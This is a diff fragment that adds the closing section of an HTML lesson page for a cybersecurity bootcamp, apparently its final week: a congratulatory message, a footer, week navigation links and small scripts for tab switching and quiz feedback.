+    <div class="nico">🎓</div>
+    <p><strong>You finished a 2-month offensive and defensive cybersecurity bootcamp.</strong> The knowledge is yours. The tools are installed. The methodology is internalized. What separates good security professionals from great ones isn't knowing more tools — it's relentless curiosity, methodical thinking, and the discipline to document and communicate findings clearly. Keep hacking (legally). Keep learning. The field never stops moving and neither should you. Welcome to the community.</p>
+  </div>
+</div><!-- /p6 -->
+
+</div><!-- .wrap -->
+
+<footer>PHASE 3 · WEEK 6 · BOOTCAMP COMPLETE · 42 DAYS · BEGINNER → PROFESSIONAL CYBERSECURITY</footer>
+
+<script>
+function show(i){
+  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.dtab').forEach(t=>t.classList.remove('on'));
+  document.getElementById('p'+i).classList.add('on');
+  document.querySelectorAll('.dtab')[i].classList.add('on');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function qa(el,type,exp){
+  const q=el.closest('.qb');
+  if(q.dataset.done)return;
+  q.dataset.done='1';
+  q.querySelectorAll('.qo').forEach(o=>{o.style.pointerEvents='none';o.style.opacity='0.4';});
+  el.style.opacity='1';el.classList.add(type);
+  const fb=q.querySelector('.qfb');
+  if(fb){fb.classList.add('show',type);fb.textContent=exp;}
+}
+</script>
+
+<div class="week-nav" style="border-top-color:var(--border,#141b26);max-width:1160px;margin:2rem auto 0;padding:2rem;display:flex;justify-content:space-between;align-items:center;">
+  <a href="week5.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">← Previous Week</a>
+  <a href="../index.html" style="color:var(--teal,#2dd4bf);border-color:rgba(45,212,191,0.3);">⌂ Lesson Hub</a>
+  <a href="week7.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">Next Week →</a>
+</div>
+
+<a href="#" id="back-to-top" title="Back to top">↑</a>
+
+<script src="../js/shared.js"></script>
+</body>
+</html>
